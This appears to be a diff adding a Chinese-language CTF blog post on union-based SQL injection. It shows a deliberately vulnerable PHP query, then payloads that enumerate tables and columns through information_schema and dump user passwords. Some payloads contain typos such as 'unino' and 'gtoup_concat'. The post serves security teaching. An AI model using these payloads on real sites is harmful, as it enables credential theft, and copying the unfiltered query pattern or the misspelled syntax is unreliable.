@@ -1,0 +1,267 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>CTF WEB SQL注入-联合注入 | Xing-Fax</title>
+
+<link rel="shortcut icon" href="https://Xing-Fax.GitHub.io/favicon.ico?v=1699016659770">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://Xing-Fax.GitHub.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Xing-Fax
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699016659770" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    CTF WEB SQL注入-联合注入
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-07-17 ·
+                    </time>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/php/" class="post-tags">
+                            # PHP
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/web/" class="post-tags">
+                            # WEB
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/ctf/" class="post-tags">
+                            # CTF
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="sql注入-联合注入">SQL注入-联合注入</h1>
+<!-- more -->
+<pre><code class="language-php">&lt;?php
+
+if( isset( $_REQUEST[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_REQUEST[ 'id' ];
+
+    // Check database
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+
+    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
+}
+
+?&gt;
+
+</code></pre>
+<p>这个是一段有漏洞的代码，从用户请求中获取id参数，直接将id参数带入SQL语句进行查询，最后输出结果</p>
+<p>可以看到，代码并未对id参数做任何的过滤和检查，因此可以向id中构造特殊语句来达到我们想要的结果</p>
+<pre><code class="language-php">$id = &quot;1&quot;;
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+//SELECT first_name, last_name FROM users WHERE user_id = '1'
+</code></pre>
+<p>正常情况下，传入参数&quot;1&quot;，表示查询ID为&quot;1&quot;用户数据</p>
+<h2 id="字符还是数字">字符还是数字</h2>
+<p>在SQL注入测试中，我们会先判断注入的查询字段是字符型还是数字型，可以输入如下语句，判断用户输入查询参数是否被单引号包裹</p>
+<pre><code class="language-php">$id = &quot;1' and '1' = '2&quot;;
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+//SELECT first_name, last_name FROM users WHERE user_id = '1' and '1' = '2'
+</code></pre>
+<p>我们要使判断恒为真，然后列出表中所有数据，可以使用 “OR”，执行后将列出此表所有数据，说明注入生效</p>
+<pre><code class="language-php">$id = &quot;1' or '1' = '1&quot;;
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+//SELECT first_name, last_name FROM users WHERE user_id = '1' or '1' = '1'
+</code></pre>
+<h2 id="确定字段数量">确定字段数量</h2>
+<p>接下来我们要开始猜测查询语句中的字段数</p>
+<pre><code class="language-php">$id = &quot;1' or 1 = 1 order by 1 #&quot;;
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+//SELECT first_name, last_name FROM users WHERE user_id = '1' or 1 = 1 order by 1 #'
+</code></pre>
+<blockquote>
+<p>#号在SQL中表示注释，在此语句中末尾多出一个单引号，这个是我们不想要的，使用 “--”也可以注释</p>
+</blockquote>
+<blockquote>
+<p>order by 是指依照输出字段的第几列进行排序</p>
+</blockquote>
+<p>我们可以依次对order by后的参数做刚刚，从 1 开始，假如order by 3执行后出现报错，那么说明此语句中只显示两个字段的数据</p>
+<h2 id="确定字段顺序">确定字段顺序</h2>
+<p>通常我们并不知道查询中的那些字段被输出，而那些字段没有被输出，所以我们可以通过union确定字段顺序</p>
+<pre><code class="language-php">$id = &quot;1' union select 1,2 #&quot;;
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+//SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,2 #'
+</code></pre>
+<blockquote>
+<p>union表示联合查询，可以将多条SQL查询语放到一条查询语句中，要保证两个查询的字段数相同</p>
+</blockquote>
+<p>通过观察那一列的数字被输出了，说明该字段是被回显的字段，没有就代表该字段并没有回显</p>
+<p>因此我们在后续注入中要保证两个查询的字段数相同</p>
+<h2 id="获取数据库名">获取数据库名</h2>
+<pre><code class="language-php">$id = &quot;1' union select 1,database() #&quot;;
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+//SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,database() #'
+</code></pre>
+<blockquote>
+<p>database()是MySQL封装的一个函数，用于返回当前数据库名称</p>
+</blockquote>
+<h2 id="获取数据表名">获取数据表名</h2>
+<pre><code class="language-sql">'1' unino select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #'
+</code></pre>
+<blockquote>
+<p>group_concat()函数的作用是将查询的数据拼接到一行输出，以逗号分隔，table_name为字段名称</p>
+</blockquote>
+<blockquote>
+<p>在MySQL中可以把information_schema看作一个数据库，其中保存着MySQL服务器维护的所有数据库信息</p>
+</blockquote>
+<h2 id="获取表中字段列表">获取表中字段列表</h2>
+<pre><code class="language-sql">'1' unin select 1,gtoup_concat(column_name) from information_schema.columns where table_name='users' #
+</code></pre>
+<blockquote>
+<p>将users表中的所有字段名称以逗号为分割放到一行输出</p>
+</blockquote>
+<p>在CTF中，回显结果可能会受到限制，如只回显第一条数据，我们可以让前一个查询的结果为空</p>
+<pre><code class="language-sql">'1' and 1=2 unin select 1,gtoup_concat(column_name) from information_schema.columns where table_name='users' #
+</code></pre>
+<blockquote>
+<p>如果group_concat函数被过滤，我们可以使用limit，如limit 5,1 表示从第五行输出一行数据</p>
+</blockquote>
+<p>这样可以保证回显的第一条数据就是我们后面拼接的查询语句结果</p>
+<h2 id="查询数据">查询数据</h2>
+<pre><code class="language-sql">'1' or 1=1 union select group_concat(user_id,firat_name,last_name),group_concat(password) from users # 
+</code></pre>
+<p>最后根据我们上面获取到的所有信息来对表就行一个数据查询，得到自己想要的数据</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://Xing-Fax.GitHub.io/post/command/" class="post-title gt-a-link">
+                    CTF WEB 命令执行漏洞
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温故而知新，可以为师矣~</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Website BY <a href="https://github.com/Xing-Fax/" target="_blank">Xing-Fax</a> Powered BY <a
+                href="https://github.com/Xing-Fax/xing-fax.github.io/" target="_blank">GitHub | <a href="https://xing-fax.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
